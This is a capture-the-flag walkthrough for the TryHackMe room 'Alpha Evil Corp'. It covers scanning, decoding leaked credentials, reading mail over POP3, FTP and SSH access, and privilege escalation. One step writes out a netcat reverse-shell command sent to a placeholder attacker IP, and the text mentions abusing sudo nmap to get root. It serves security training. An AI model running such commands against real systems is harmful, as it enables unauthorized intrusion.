# Tryhackme Challenge: Alpha Evil Corp
## Author: Abhiram B.S.N.
### This room makes you aware about the concept of "Security by Obscurity"

```bash
export IP=MACHINE_IP
```

### Task 1: Decryption of Data

1. Deploy Machine

```
No Answer Needed
```

#### First we do a nmap scan to see open ports

```bash
nmap -sC -sV -vvvv -A -oN nmap.scan.initial $IP -Pn
```

##### Output

```
PORT      STATE  SERVICE         REASON       VERSION
20/tcp    closed ftp-data        conn-refused
21/tcp    open   ftp             syn-ack      vsftpd 3.0.3
22/tcp    open   ssh             syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:71:26:6e:f3:14:4c:39:47:24:f4:e8:94:0b:a9:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxtEAu6DKb1vNy6lTKB/v4lJe4vDpYHB/ACA9Kp18xfPO2mHUJdci1iaIZW/dLM8hOGeMwSaxe5u/IDKvn39n0jWsJ6qsaL7eHjzpv3MqkE74mBnF401w8XMGs2cKiGg23/qeiwa9xE9hA7TWm3a08ZSx+1tlDH1J43RSdb9ttRkNxSdzB8d1LICu7bfJibhfts1m8C7cQF1eZ4lFjjZ6BZzzRApCQovjD1QF6VGbsMF64/+Mx/bdGtKRt3ktnAcrLShX1Dw20odsZr/lvm82DlrEGLT4LaNy1scrzGEFdyVfLWfCYjkcHcN9uK/GMzAUaCR6dbKBeabPzjguvl1LX
|   256 9e:62:07:33:0b:1f:34:d9:2c:42:e7:cf:a2:ec:b1:07 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKqKY0X9iPg7KWRJvKnbbRd77no7kUSE908Pcp3RavwBWH1wxvbsUQeqNybalRcW0fOKBXKS0XQUdxEA7TQn2lc=
|   256 30:03:b8:71:f4:b1:20:b3:35:41:4d:19:9d:7f:48:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB6Jgim4HSc5bAef6uRTI2ea55rbUkeRzy1xVmQlrJrm
25/tcp    open   smtp            syn-ack      Postfix smtpd
|_smtp-commands: alphaevilcorp.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=alphaevilcorp.localdomain
| Issuer: commonName=alphaevilcorp.localdomain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-31T10:52:25
| Not valid after:  2030-08-29T10:52:25
| MD5:   bf71 5bf7 3902 10ef e661 c39e edb2 ea4c
| SHA-1: 0836 397a 5b85 350a 59d4 cd95 4a40 a403 a867 a8e0
| -----BEGIN CERTIFICATE-----
| MIIC2DCCAcCgAwIBAgIJAIOK8Hpn59bfMA0GCSqGSIb3DQEBCwUAMCQxIjAgBgNV
| BAMMGWFscGhhZXZpbGNvcnAubG9jYWxkb21haW4wHhcNMjAwODMxMTA1MjI1WhcN
| MzAwODI5MTA1MjI1WjAkMSIwIAYDVQQDDBlhbHBoYWV2aWxjb3JwLmxvY2FsZG9t
| YWluMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4GWNkH32GEp7YjLf
| bA0nccf0DBCvWJz5Ppwae1Im4Xi4xGen8moKFUhi5XLZpESw7+QmuIh/W4FhbBCZ
| 0gUjf65H9P2oJWFoofjzYQ1Gmft2dtbySkh34WrvM5CpGfygMg+sm06YXfu2OKaL
| B5jmQI/XTHdCUCP9DmJ+E1qDdCeK3+ClHyudgU3ZuHcORMfdS5KMX14Jtfaqe90u
| 7MPjcyjuGSncG52JA4RqpHfG37mepyot4UdZ1K87+TPaX8co6YQTErhdj83gqFgc
| PnQKEDIjsgdnuxBOcaQBj9nrG7/jMXaiOHYYVU8CYDtGUXkqfMNMNWLu/N97VcOr
| bGWXeQIDAQABow0wCzAJBgNVHRMEAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQCg5uBY
| sQdJSNahx4N8duU5HjoazE+2V8Joq1c4IO2VKQomNHhG8wxcqolJuIO10lPEX7Yp
| Xo10ec/fLCyKQGtiRtnguo7rT/dT4+P+9AK9Mv1a0GUbZmfEnX4CPBEs3jLUGkzM
| VnsWLQWniaCeZZ9EZSnCHa+wcHoKfK60MUps3amh/j8nhJwLTAz5cUwWxCOiPMcw
| 75eBvKPY4QtnKNWlxa4d+RQp3A1dVmxGebjYwgjUTFA11tMVsbEGPn+/Syj+Qm4l
| TGNlI9HNd1e0xDU+sByup+7d6Fzn7mbOEK9Ak9b9FP28uCuhgmjAiB977Zwtkwlg
| LIABlluZrq53+/i5
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
110/tcp   open   pop3            syn-ack      Dovecot pop3d
|_pop3-capabilities: UIDL CAPA USER TOP PIPELINING RESP-CODES AUTH-RESP-CODE SASL(PLAIN)
143/tcp   open   imap            syn-ack      Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS OK more LITERAL+ have post-login ENABLE listed capabilities Pre-login ID AUTH=PLAINA0001 SASL-IR IDLE IMAP4rev1
```

2. How many Users' Passwords were leaked?

```
For this we visit the link given in the hint i.e https://pastebin.com/dNnvFTQd
Here we find that <REDACTED> users' passwords were leaked

Ans. 2

But we see that passwords are encoded, on examining the hint we see that the passwords are encoded with
Base58

so we decode the passwords.
```

3. What is the username of the user which has Email with FTP Credentials?

```
As per nmap scan we see that pop3 dovecot port 110 is open

there fore we connect using telnet
```
```bash
telnet $IP 110
```
```
On careful examination of all mails of the users, we see that REDACTED user's mail has the ftp credentials, but these are also encrypted. On careful observation we see that it is a combination of base64 and rot13.
```

```
Ans. john
```

```
On Decoding the cipher we get the username and password of ftp server.
```

4. Username of FTP User?

```
Ans. greer
```

5. Password of FTP User?

```
Ans. james13
```

### Task 2: Access to Box

```
On Accessing the ftp server we find a hidden file .credentials, we download it and upon viewing we see a very peculiar string which appears to be base64 but is not. On seeing the question and the text we guess it is a Vigenere Cipher.

So we again go through the mail server and get the key to the vigenere. But the key is also encypted with rot47
upon decrpytion of key we then decode the cipher, which leads to more encoded text, which is a combination of base64 and rot47.
```
1. Decrypt the cipher?

```
Ans. No answer Needed.
```

2. Key to the Cipher?

```
shbXFrBKApRGLrqlrPmjrWoiUrfTMWfmQGBOnHkwwbcbMmyBKQyQqLUH
```


```
On Decrypting we get the ssh credentials for a low level user
```

3. What is the Username you retrieved from the Deciphered Message?

```
Ans. fusco
```

4. What is the Password you retrieved from the Deciphered Message>

```
Ans. francisco
```

```
On accessing the machine with ssh and enumerating the home directory we get the number of users.
```

5. Number of Users in the Machine? (excluding vagrant) ?

```
7
```

```
On Enumerating we see that fusco can execute netcat (/bin/nc) as shaw (user)
```

6. Which SUID binary gives access to another User?

```
/bin/nc
```

7. To Which user the binary elevates you?

```
shaw
```
```
Elevating to shaw using the following command
```
```bash
sudo -u shaw /bin/nc -e /bin/bash <ATTACKER_IP> <ATTACKER_PORT>
```

```
After elevating to the user shaw we enumerate and we find that shaw can execute 
/usr/bin/nmap as root
```

8. Which SUID binary gives access to root Account?

```
/usr/bin/nmap
```

9. User flag

```
Ans. REDACTED
```

```
Elevating to root by exploiting nmap, we get root
```

10. Root flag

```
Ans. REDACTED
```